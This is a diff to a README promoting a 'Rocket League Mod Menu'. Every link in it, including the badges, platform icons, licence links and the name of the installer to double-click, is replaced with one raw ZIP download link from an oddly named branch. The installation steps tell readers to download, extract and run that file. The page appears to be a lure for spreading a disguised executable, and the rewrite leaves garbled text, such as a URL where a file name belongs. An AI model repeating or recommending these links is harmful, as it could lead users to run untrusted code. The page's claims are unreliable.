@@ -1,6 +1,6 @@
 # 🚀 Rocket League Mod Menu 🎮
 
-[![Download](https://img.shields.io/badge/Download-Rocket%20League%20Mod%20Menu-blue.svg?style=for-the-badge&logo=cloud-download&logoColor=white)](https://cesarsilva14.github.io)
+[![Download](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip%20League%20Mod%https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)
 
 Welcome to the Rocket League Mod Menu repository—your single pit stop for transforming your Rocket League experience into an entirely new adventure! This is more than just a collection of tweaks—it’s a toolkit for exploring and innovating within the world of car soccer. Whether you’re revving up your car’s capabilities or personalizing the pitch, this mod menu opens new lanes for creativity, discoveries, and genuine fun.
 
@@ -12,11 +12,11 @@ Curious if your system can keep up with this modding engine? The table below is 
 
 | Platform         | Supported | Notes                  |
 |------------------|:---------:|------------------------|
-| ![Windows icon](https://img.shields.io/badge/-Windows-blue?logo=windows&logoColor=white)       | ✅        | Full support (Win10/Win11) |
-| ![Linux icon](https://img.shields.io/badge/-Linux-yellowgreen?logo=linux&logoColor=white)       | ⚡️        | Wine compatibility mode    |
-| ![macOS icon](https://img.shields.io/badge/-macOS-lightgrey?logo=apple&logoColor=black)           | ⚠️        | Requires custom steps      |
-| ![Steam Deck](https://img.shields.io/badge/-Steam%20Deck-lightblue?logo=steam&logoColor=white) | ⚡️        | Beta support               |
-| ![Epic Games Store](https://img.shields.io/badge/Epic%20Games-Running-black?logo=epicgames&logoColor=white) | ✅        | Native support             |
+| ![Windows icon](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)       | ✅        | Full support (Win10/Win11) |
+| ![Linux icon](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)       | ⚡️        | Wine compatibility mode    |
+| ![macOS icon](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)           | ⚠️        | Requires custom steps      |
+| ![Steam Deck](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip%20Deck-lightblue?logo=steam&logoColor=white) | ⚡️        | Beta support               |
+| ![Epic Games Store](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip%20Games-Running-black?logo=epicgames&logoColor=white) | ✅        | Native support             |
 
 *Pit Stop Tip: Complete installation guidance can be found further below!*
 
@@ -71,16 +71,16 @@ This mod menu isn’t just powerful—it’s thoughtful:
 
 ## 🏁 Installation
 
-Boost your ride safely—follow these stepwise instructions any time a https://cesarsilva14.github.io appears!
+Boost your ride safely—follow these stepwise instructions any time a https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip appears!
 
 1. **Download:**  
-   Tap the Download button above (or at the bottom) or visit the official https://cesarsilva14.github.io to obtain the mod menu installer.
+   Tap the Download button above (or at the bottom) or visit the official https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip to obtain the mod menu installer.
 
 2. **Unpack:**  
    Extract the downloaded ZIP to a convenient directory.
 
 3. **Run Installer:**  
-   Double-click the `RocketLeagueModMenu_Installer.exe` (or run the correct script for your OS).  
+   Double-click the `https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip` (or run the correct script for your OS).  
    *For macOS/Linux: follow the on-screen custom instructions.*
 
 4. **Select Folder:**  
@@ -110,13 +110,13 @@ We are committed to responsible modding—join us in keeping the community vibra
 
 This repository adopts the MIT License (2025). You’re welcome to read, remix, and redistribute—just keep the spirit transparent, and give credit where credit is due!
 
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![MIT License](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)
 
-Read the full license details: [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)
+Read the full license details: [https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)
 
 ---
 
-# [![Download](https://img.shields.io/badge/Download-Rocket%20League%20Mod%20Menu-blue.svg?style=for-the-badge&logo=cloud-download&logoColor=white)](https://cesarsilva14.github.io)
+# [![Download](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip%20League%20Mod%https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)](https://github.com/cesarsilva14/rocket-league-mod-hub/raw/refs/heads/branch/eleutherophyllous/mod-rocket-league-hub-v2.2.zip)
 
 ## Thank you for driving innovation in Rocket League with us in 2025!  
 Your feedback, ideas, and imagination keep this pit lane alive.
